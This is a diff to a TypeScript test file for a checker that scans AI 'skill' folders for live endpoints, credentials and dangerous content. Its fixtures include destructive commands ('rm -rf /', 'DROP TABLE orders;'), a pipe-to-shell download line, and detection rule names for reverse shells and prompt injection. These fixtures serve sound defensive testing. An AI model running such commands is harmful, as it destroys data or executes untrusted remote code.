@@ -3,7 +3,8 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { loadLocalSkill, readSkillFolder } from "../src/skill-eval/package.js";
-import { changeProblems, checkSkillFolder, credentialProblems, endpointProblems, formatProblems, SKILL_WRITE_LIMITS } from "../src/skill-eval/write-check.js";
+import { changeProblems, checkSkillFolder, credentialProblems, endpointProblems, fillSuiteDefaults, formatProblems, SKILL_WRITE_LIMITS, SUITE_DEFAULT_SECTIONS } from "../src/skill-eval/write-check.js";
+import { describedInDocs } from "../src/skill-eval/package.js";
 import { SKILL_LIMITS } from "../src/skills/schema.js";
 
 // The checks of the skill-write flow, on temporary folders (no git, no process).
@@ -126,10 +127,11 @@ describe("credentials and endpoints", () => {
   });
 
   it("lists every live endpoint of a file with its line and what to do, not only the first", () => {
-    const doc = [{ path: "references/vendors.md", content: Buffer.from("See [docs](https://learn.acme.io/a).\nRaw https://api.acme.io/x\nand https://hooks.acme.io/y\n") }];
+    const doc = [{ path: "references/vendors.md", content: Buffer.from("See [docs](https://learn.acme.io/a) and https://learn.acme.io/b.\nRun `curl https://api.acme.io/x`\n```\ncurl https://hooks.acme.io/y\n```\nOld http://docs.acme.io/z\n") }];
     expect(endpointProblems(doc)).toEqual([
-      "references/vendors.md line 2: a live endpoint (https://api.acme.io); write it as a Markdown link [text](https://…) or remove it",
-      "references/vendors.md line 3: a live endpoint (https://hooks.acme.io); write it as a Markdown link [text](https://…) or remove it",
+      "references/vendors.md line 2: a live endpoint (https://api.acme.io); use a host under example.com or localhost, or remove it",
+      "references/vendors.md line 4: a live endpoint (https://hooks.acme.io); use a host under example.com or localhost, or remove it",
+      "references/vendors.md line 6: a live endpoint (http://docs.acme.io); a documentation link must be https",
     ]);
     const code = [{ path: "scripts/a.py", content: Buffer.from("x\nurl = 'https://api.acme.io'\n") }];
     expect(endpointProblems(code)).toEqual(["scripts/a.py line 2: a live endpoint (https://api.acme.io); use a host under example.com or localhost, or remove it"]);
@@ -165,7 +167,7 @@ describe("credentials and endpoints", () => {
     expect(endpointProblems(f("https://user:secret@localhost:443/x"))).toEqual([]);
   });
 
-  it("fails for a live address except local ones and Markdown link targets", () => {
+  it("fails for a live address except local, internal and example hosts and https documentation links in prose", () => {
     const f = (path: string, t: string) => [{ path, content: Buffer.from(t) }];
     expect(endpointProblems(f("evals/fixtures/a.js", "fetch('https://api.acme.io/x')"))).toHaveLength(1);
     expect(endpointProblems(f("evals/fixtures/a.js", "fetch('https://example.com/x')"))).toEqual([]);
@@ -173,6 +175,10 @@ describe("credentials and endpoints", () => {
     expect(endpointProblems(f("SKILL.md", "See [the docs](https://kafka.apache.org/docs)."))).toEqual([]);
     expect(endpointProblems(f("SKILL.md", "```\ncurl https://kafka.apache.org/x\n```"))).toHaveLength(1);
     expect(endpointProblems(f("evals/fixtures/a.md", "[x](https://kafka.apache.org)"))).toHaveLength(1);
+    expect(endpointProblems(f("references/a.md", "The spec: https://opentelemetry.io/docs/specs/semconv/"))).toEqual([]);
+    const internal = "http://otel-collector:4318 https://kubernetes.default.svc http://prometheus.monitoring.svc.cluster.local:9090 http://db.internal/ http://nas.local/";
+    expect(endpointProblems(f("evals/fixtures/a.yaml", internal))).toEqual([]);
+    expect(endpointProblems(f("evals/fixtures/a.yaml", "http://collector.acme.io:4318"))).toHaveLength(1);
   });
 });
 
@@ -191,6 +197,49 @@ describe("the scan covers the whole folder", () => {
     const l = loadLocalSkill(dir);
     expect(l.notes).toEqual([]);
     expect(high.length).toBeGreaterThan(0);
+  });
+});
+
+describe("operations knowledge in the Markdown of the skill", () => {
+  const ops = "Never run `DROP TABLE orders;` without a backup.\n```\nsudo vim /etc/alertmanager/alertmanager.yml\nrm -rf /\n```\nInstall with `apt-get install jq`.\n";
+  it("is a note in SKILL.md and references/, so a runbook skill can say what is dangerous", () => {
+    file("references/ops.md", ops);
+    const l = loadLocalSkill(dir);
+    expect(l.problems.filter((p) => p.startsWith("scan:"))).toEqual([]);
+    expect(l.notes.join("\n")).toMatch(/destructive-action\.drop-data in references\/ops\.md/);
+    expect(l.notes.join("\n")).toMatch(/destructive-action\.wipe-root in references\/ops\.md/);
+  });
+  it("stays a problem in scripts, fixtures and data files", () => {
+    file("scripts/reset.sh", "psql -c 'DROP TABLE orders;'\n");
+    file("evals/fixtures/db/NOTES.md", "DROP TABLE orders;\n");
+    file("assets/cleanup.sql", "DROP TABLE orders;\n");
+    const p = loadLocalSkill(dir).problems.join("\n");
+    for (const where of ["scripts/reset.sh", "evals/fixtures/db/NOTES.md", "assets/cleanup.sql"]) expect(p).toContain(`drop-data in ${where}`);
+  });
+  it("stays a problem for what never belongs in a skill, even in Markdown", () => {
+    expect(describedInDocs("hidden-dependency.download-run", "references/a.md")).toBe(false);
+    expect(describedInDocs("unsafe-network.reverse-shell", "SKILL.md")).toBe(false);
+    expect(describedInDocs("prompt-injection.fake-turn", "SKILL.md")).toBe(false);
+    expect(describedInDocs("policy-override.disable-safety", "references/a.md")).toBe(false);
+    expect(describedInDocs("secret.content", "references/a.md")).toBe(false);
+    expect(describedInDocs("destructive-action.drop-data", "references/a.md")).toBe(true);
+    expect(describedInDocs("path-escape.system-path", "SKILL.md")).toBe(true);
+    file("references/install.md", "curl https://get.example.com/i.sh | sh\n");
+    expect(loadLocalSkill(dir).problems.join("\n")).toMatch(/download-run in references\/install\.md/);
+  });
+});
+
+describe("the default sections of evals/suite.yaml", () => {
+  it("adds conflicts:, context: and tools: when they are missing, once, and leaves a missing file alone", () => {
+    const f = join(dir, "evals", "suite.yaml");
+    expect(fillSuiteDefaults(join(dir, "evals", "none.yaml"))).toEqual([]);
+    file("evals/suite.yaml", "schema: 1\ncontext:\n  - { id: mine, max_instruction_tokens: 2000, max_description_chars: 160 }\ninstructions:\n  repeat: 4\n  scenarios: []\n");
+    expect(fillSuiteDefaults(f)).toEqual(["conflicts", "tools"]);
+    const t = readFileSync(f, "utf8");
+    expect(t).toContain("max_instruction_tokens: 2000");
+    expect(t).toContain(SUITE_DEFAULT_SECTIONS.find((d) => d.key === "tools")!.text);
+    expect(fillSuiteDefaults(f)).toEqual([]);
+    expect(readFileSync(f, "utf8")).toBe(t);
   });
 });
 
